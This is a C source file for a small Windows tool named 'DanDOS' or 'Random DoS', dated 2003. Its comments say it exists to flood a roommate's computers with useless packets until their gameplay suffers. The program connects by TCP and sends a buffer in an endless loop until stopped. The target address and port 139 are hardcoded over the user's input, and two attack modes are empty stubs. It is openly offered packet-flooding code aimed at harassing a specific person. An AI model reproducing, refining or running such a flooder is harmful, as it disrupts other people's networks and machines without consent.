/*
  DanDOS
  2003-03-18
  Nikep

  Bombards annoying roommate's computers with useless random packets,
  to the point that they whine about their rotten gameplay, complain 
  about the stupid networks, say f* more times than you can count on
  all fingers and toes, and get so mad that they move out.

  It's not truly a malevolent program. It's just meant to cause lots
  and lots of ping spikes for the poor player.

  Well, that's the idea anyway. Everyone can dream, can't they?
*/

#define WIN32_LEAN_AND_MEAN
#define NO_STRICT
#define WINVER 0x0400
#include <windows.h>
#include <commctrl.h>
#include <winsock.h>
#define CreateSocket socket		//redefine some names for consistency
#define CloseSocket closesocket //and sane sensibility
#define ConnectSocket connect
#define ControlSocketIo ioctlsocket
#define GetHostByName gethostbyname
#define GetHostByAddr gethostbyaddr
#define WriteSocket send
#include "resource.h"

#define ProgMemBase (void*)0x400000
#define true 1  //in case this is C
#define false 0

void ConvertNameToIp(int reverse);

#ifndef _DEBUG
#define _DEBUG
#endif
#ifdef _DEBUG
void debugwrite(char* Message, ...);
char debugwrite_Buffer[256];
#else
#define debugwrite() //
#endif

BOOL CALLBACK MainDlgProc(HWND hwnd, UINT message, long wParam, long lParam);
void __stdcall FatalErrorMessage(char* Message);
void __stdcall SetStatusMessage(LPSTR msg);

////////////////////////////////////////////////////////////////////////////////
// common global variables
//static char ErrMsgBfr[80];
int count;
//RECT rect;
//WINDOWPOS wp;

////////////////////////////////////////////////////////////////////////////////
// window vars

HWND MainHwnd, StatusHwnd, TargetNameHwnd, TargetIpHwnd, AttackTypeHwnd;
MSG msg;

////////////////////////////////////////////////////////////////////////////////
// misc text constants

const char ProgTitle[]={"Random DoS"};
const char ProgClass[]={"RanDoSClass"};
const char TextAbout[]={
	"Bombards annoying roommate's computers with useless random packets, "
	"to the point that they whine about their rotten gameplay, complain "
	"about the stupid networks, say f* more times than you can count on "
	"all fingers and toes, and get so mad that they move out. Well, that's "
	"the idea anyway. Everyone can dream, can't they?"
    "\n\n"
	"It's not truly a malevolent program. It's just meant to cause lots "
	"and lots of ping spikes for the poor player."
	"\n\n"
    "NikepSoft 2003-03-18"
    };

////////////////////////////////////////////////////////////////////////////////
// program specific vars

unsigned int Sending=false,
			 SendMode=0;
char TargetName[128];
char TargetIpStr[16];
unsigned int TargetIp;
unsigned int TargetSize=1024;
char TargetBuffer[1024];
WSADATA wsa;
SOCKET SocketHandle;
SOCKADDR SocketAddress = {PF_INET, 0};

////////////////////////////////////////////////////////////////////////////////
// Program code

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	//static INITCOMMONCONTROLSEX icc = {sizeof(INITCOMMONCONTROLSEX), ICC_LISTVIEW_CLASSES|ICC_DATE_CLASSES|ICC_BAR_CLASSES};
	static INITCOMMONCONTROLSEX icc = {sizeof(INITCOMMONCONTROLSEX), ICC_BAR_CLASSES};

	// initialize common controls, otherwise status bar, date picker, and
	// list view do not appear (creating window fails)
	InitCommonControlsEx(&icc);
	MainHwnd=CreateDialogParam(ProgMemBase,
		(LPSTR)IDD_MAIN,
		NULL,
		(DLGPROC)MainDlgProc,
		0);
	//SetWindowLong(MainHwnd, GWL_WNDPROC, (LONG)MainWndProc);

	StatusHwnd=GetDlgItem(MainHwnd, IDC_STATUS);
	TargetNameHwnd=GetDlgItem(MainHwnd, IDC_TARGET_NAME);
	TargetIpHwnd=GetDlgItem(MainHwnd, IDC_TARGET_IP);
	AttackTypeHwnd=GetDlgItem(MainHwnd, IDC_ATTACK_TYPE);
	//CreateWindow( "EDIT", "Grr!", WS_CHILD|WS_VISIBLE, 0,0, 100,30, MainHwnd,(HMENU)20, ProgMemBase, 0);
	//SetWindowLong(TargetNameHwnd, GWL_EXSTYLE,GetWindowLong(TargetNameHwnd, GWL_EXSTYLE) & ~WS_EX_NOPARENTNOTIFY);
	//SetWindowLong(TargetIpHwnd, GWL_EXSTYLE, GetWindowLong(TargetIpHwnd, GWL_EXSTYLE) & ~WS_EX_NOPARENTNOTIFY);

	SetStatusMessage("Initializing WinSock");
	if (WSAStartup( 0x101, &wsa))
		FatalErrorMessage(">_< Could not initialize Windows socket library");
	debugwrite("socket description=%s,", wsa.szDescription);

	SetStatusMessage("~_~ Ready");
	while (true) {
		// close any open socket from last loop
		Sending=false;
		if (SocketHandle) CloseSocket(SocketHandle);

		// idle message loop
		while(GetMessage(&msg, 0, 0,0)>0 && !Sending)
			if(!IsDialogMessage(MainHwnd, &msg))
				DispatchMessage(&msg);

		if (!Sending||msg.message==WM_QUIT) break;

		// enter bombardment loop
		SetStatusMessage("*_* Bombardment started");
		while(Sending) {
			if (PeekMessage(&msg, 0, 0,0, PM_REMOVE)) {
				if (msg.message==WM_QUIT) break;
				if(!IsDialogMessage(MainHwnd, &msg))
					DispatchMessage(&msg);
			} else {
				switch (SendMode)
				{
				case 0:
					WriteSocket(SocketHandle, TargetBuffer,TargetSize, 0);
					break;
				case 1:
				case 2:
					break;
				}
			}
		}
		SetStatusMessage("~_~ Bombardment ended");
	}

	if (SocketHandle) CloseSocket(SocketHandle);
	WSACleanup();
	DestroyWindow(MainHwnd);
	return 0;
}

BOOL CALLBACK MainDlgProc(HWND hwnd, UINT message, long wParam, long lParam) 
{
	//debugwrite("dlgmsg=%X w=%d l=%X", message, wParam, lParam);
	switch (message) {
	case WM_INITDIALOG:
		DefWindowProc(hwnd, WM_SETICON, true, (LONG)LoadIcon(ProgMemBase, (LPSTR)IDI_MAIN));
		return true;
	case WM_COMMAND:
		switch (wParam) {
		case IDOK:
			if (SendMessage(TargetNameHwnd, EM_GETMODIFY, 0,0))
				ConvertNameToIp(false);
			else if (SendMessage(TargetIpHwnd, EM_GETMODIFY, 0,0))
				ConvertNameToIp(true);

			SetStatusMessage("o_o Connecting");

			// attempt to create socket
			switch (SendMode) {
			case 0: //TCP connection
				SocketHandle=CreateSocket(AF_INET, SOCK_STREAM, 0);
				if (SocketHandle==INVALID_SOCKET) {
					debugwrite("WSA socket error=%d", WSAGetLastError());
					SetStatusMessage(">_< Socket failed");					
					return false;
				}
				//{
				//unsigned int temp=true;
				//ControlSocketIo(SocketHandle, FIONBIO, &temp);
				//}
				TargetIp = 128 | 193<<8 | 254<<16 | 187<<24;
				*(unsigned short*)(&SocketAddress.sa_data[0])=139<<8;
				*(unsigned int*)(&SocketAddress.sa_data[2])=TargetIp;
				if (ConnectSocket(SocketHandle, &SocketAddress, sizeof(SocketAddress)) ) {
					debugwrite("WSA connect error=%d", WSAGetLastError());
					CloseSocket(SocketHandle);
					SetStatusMessage(">_< Connection failed");					
					return false;
				}
			case 1:
			case 2:
				break;
			}

			EnableWindow(GetDlgItem(hwnd, IDOK), false);
			EnableWindow(GetDlgItem(hwnd, IDCANCEL), true);
			Sending=true;
			break;

		case IDCANCEL:
			CloseSocket(SocketHandle);

			//stop the packet bombardment
			EnableWindow(GetDlgItem(hwnd, IDOK), true);
			EnableWindow(GetDlgItem(hwnd, IDCANCEL), false);
			Sending=false;
			break;

		case IDCLOSE:
			goto DialogClosed;

		case IDC_TARGET_NAME|(EN_KILLFOCUS<<16):
		case IDC_TARGET_IP|(EN_KILLFOCUS<<16):
			if (SendMessage((HWND)lParam, EM_GETMODIFY, 0,0))
				ConvertNameToIp( wParam == (IDC_TARGET_IP|(EN_KILLFOCUS<<16)));
			break;
		case IDHELP:
	ShowHelp:
			MessageBox(MainHwnd, TextAbout, ProgTitle, MB_OK);
		}
		break;
	case WM_HELP:
		goto ShowHelp;
	case WM_CLOSE:
	DialogClosed:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	}
	return false;
}

void ConvertNameToIp(int reverse) {
	LPHOSTENT wsh;

	if (reverse) { //ip to name
		GetWindowText(TargetIpHwnd, TargetIpStr, sizeof(TargetIpStr));
		SendMessage(TargetIpHwnd, EM_SETMODIFY, false,0);
		SetStatusMessage("o_o Determining host name of IP address...");

		if ((TargetIp = inet_addr(TargetIpStr)) != INADDR_NONE) {
			//TargetIp = 128.193.254.187;
			//TargetIp = 128 | 193<<8 | 254<<16 | 187<<24;
			if (wsh = GetHostByAddr((char*)&TargetIp, 4, PF_INET)) {
				lstrcpyn(TargetName, wsh->h_name, sizeof(TargetName));
				SetWindowText(TargetNameHwnd, TargetName);
				SetStatusMessage("^_^ IP resolved to name");
			} else {
				SetStatusMessage(">_< Could not resolve IP to any name");
			}
		} else {
			SetStatusMessage(">_< Invalid IP address (###.###.###.###)");
		}

	} else { //name to ip
		MessageBeep(MB_ICONERROR);
		GetWindowText(TargetNameHwnd, TargetName, sizeof(TargetName));
		SendMessage(TargetNameHwnd, EM_SETMODIFY, false,0);

		SetStatusMessage("o_o Resolving host to IP address...");
		if (wsh = GetHostByName(TargetName)) {
			//debugwrite(" adr[]=%X", *((unsigned long*)(wsh->h_addr_list[0])) );

			//this is the most convoluted, ugly standard to have been made >_<
			TargetIp=*((unsigned long*)(wsh->h_addr_list[0]));

			lstrcpyn(
				TargetIpStr,
				inet_ntoa(*(struct in_addr *)&TargetIp),	//why make me do
				sizeof(TargetIpStr));						//these dumb things?

			SetWindowText(TargetIpHwnd, TargetIpStr);
			SetStatusMessage("^_^ Name resolved to IP");
		} else {
			SetStatusMessage(">_< Could not resolve name to any IP");
		}
	}
}

void __stdcall SetStatusMessage(LPSTR msg)
{
	SendMessage(StatusHwnd, WM_SETTEXT, 0,(LPARAM)msg);
}

// display message box before ending program
void __stdcall FatalErrorMessage(char* Message)
{
	MessageBox (0, Message, ProgTitle, MB_OK|MB_TOPMOST|MB_ICONERROR|MB_TASKMODAL);
	ExitProcess (-1);
}

// write formatted debug string for debugger to catch
//static char debugwrite_Buffer[256];
#ifdef _DEBUG
void debugwrite(char* Message, ...)
{
	int strlen;
	//wvsprintf((LPSTR)Buffer, Message, (va_list)(&Message)+4);
	wvsprintf((LPSTR)debugwrite_Buffer, (LPSTR)Message, (char*)((&Message)+1));
	strlen=lstrlen((LPSTR)debugwrite_Buffer);
	debugwrite_Buffer[strlen]='\n';
	debugwrite_Buffer[strlen+1]='\0';
	OutputDebugString((LPSTR)debugwrite_Buffer);
}
#endif
